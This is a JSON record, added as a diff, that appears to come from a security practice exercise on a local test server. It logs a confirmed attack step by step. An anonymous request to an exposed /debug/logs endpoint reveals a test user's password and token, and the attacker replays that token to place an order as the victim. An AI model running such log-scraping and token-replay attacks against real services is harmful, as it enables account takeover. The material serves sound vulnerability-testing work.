@@ -1,0 +1,181 @@
+{
+  "id": "V-07",
+  "server": {
+    "host": "127.0.0.1",
+    "port": 6152,
+    "pid": 960,
+    "sandbox_root": "C:\\Users\\ASUS\\AppData\\Local\\Temp\\itmo-practice-06-c_cjiaqs"
+  },
+  "requests": [
+    {
+      "label": "legitimate login: bob",
+      "request": {
+        "method": "POST",
+        "target": "/login",
+        "headers": {
+          "Host": "127.0.0.1:6152",
+          "Accept-Encoding": "identity",
+          "Connection": "close",
+          "Content-Type": "application/json",
+          "Content-Length": "44"
+        },
+        "body_text": "{\"username\": \"bob\", \"password\": \"learn-bob\"}"
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.13.9",
+          "Date": "Wed, 28 Oct 2026 07:44:24 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "45"
+        },
+        "body_text": "{\"token\": \"0fe704e182cf41c9b44f037f4aca0fc9\"}",
+        "json": {
+          "token": "0fe704e182cf41c9b44f037f4aca0fc9"
+        }
+      }
+    },
+    {
+      "label": "victim uses token",
+      "request": {
+        "method": "GET",
+        "target": "/profile?id=2",
+        "headers": {
+          "Host": "127.0.0.1:6152",
+          "Accept-Encoding": "identity",
+          "Connection": "close",
+          "X-Token": "0fe704e182cf41c9b44f037f4aca0fc9"
+        },
+        "body_text": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.13.9",
+          "Date": "Wed, 28 Oct 2026 07:44:24 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "92"
+        },
+        "body_text": "[{\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+        "json": [
+          {
+            "id": 2,
+            "name": "TEST_BOB",
+            "email": "bob@example.invalid",
+            "address": "TEST_ADDRESS_B"
+          }
+        ]
+      }
+    },
+    {
+      "label": "anonymous reads victim requests",
+      "request": {
+        "method": "GET",
+        "target": "/debug/logs",
+        "headers": {
+          "Host": "127.0.0.1:6152",
+          "Accept-Encoding": "identity",
+          "Connection": "close"
+        },
+        "body_text": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.13.9",
+          "Date": "Wed, 28 Oct 2026 07:44:24 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "594"
+        },
+        "body_text": "[{\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"bob\", \"password\": \"learn-bob\"}, \"headers\": {\"Host\": \"127.0.0.1:6152\", \"Accept-Encoding\": \"identity\", \"Connection\": \"close\", \"Content-Type\": \"application/json\", \"Content-Length\": \"44\"}}, {\"method\": \"GET\", \"target\": \"/profile?id=2\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:6152\", \"Accept-Encoding\": \"identity\", \"Connection\": \"close\", \"X-Token\": \"0fe704e182cf41c9b44f037f4aca0fc9\"}}, {\"method\": \"GET\", \"target\": \"/debug/logs\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:6152\", \"Accept-Encoding\": \"identity\", \"Connection\": \"close\"}}]",
+        "json": [
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "bob",
+              "password": "learn-bob"
+            },
+            "headers": {
+              "Host": "127.0.0.1:6152",
+              "Accept-Encoding": "identity",
+              "Connection": "close",
+              "Content-Type": "application/json",
+              "Content-Length": "44"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/profile?id=2",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:6152",
+              "Accept-Encoding": "identity",
+              "Connection": "close",
+              "X-Token": "0fe704e182cf41c9b44f037f4aca0fc9"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/debug/logs",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:6152",
+              "Accept-Encoding": "identity",
+              "Connection": "close"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "label": "attacker replays token obtained from logs",
+      "request": {
+        "method": "POST",
+        "target": "/orders",
+        "headers": {
+          "Host": "127.0.0.1:6152",
+          "Accept-Encoding": "identity",
+          "Connection": "close",
+          "X-Token": "0fe704e182cf41c9b44f037f4aca0fc9",
+          "Content-Type": "application/json",
+          "Content-Length": "19"
+        },
+        "body_text": "{\"product\": \"lamp\"}"
+      },
+      "response": {
+        "status": 201,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.13.9",
+          "Date": "Wed, 28 Oct 2026 07:44:24 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "55"
+        },
+        "body_text": "{\"id\": 3, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500}",
+        "json": {
+          "id": 3,
+          "owner": 2,
+          "product": "lamp",
+          "price": 1500
+        }
+      }
+    }
+  ],
+  "confirmed": true,
+  "effect": {
+    "password_disclosed": "learn-bob",
+    "token_disclosed": "0fe704e182cf41c9b44f037f4aca0fc9",
+    "impersonated_order": {
+      "id": 3,
+      "owner": 2,
+      "product": "lamp",
+      "price": 1500
+    }
+  },
+  "server_shutdown": {
+    "exit_code": 0,
+    "stderr": "",
+    "extra_stdout": "",
+    "temporary_root_removed": true
+  }
+}
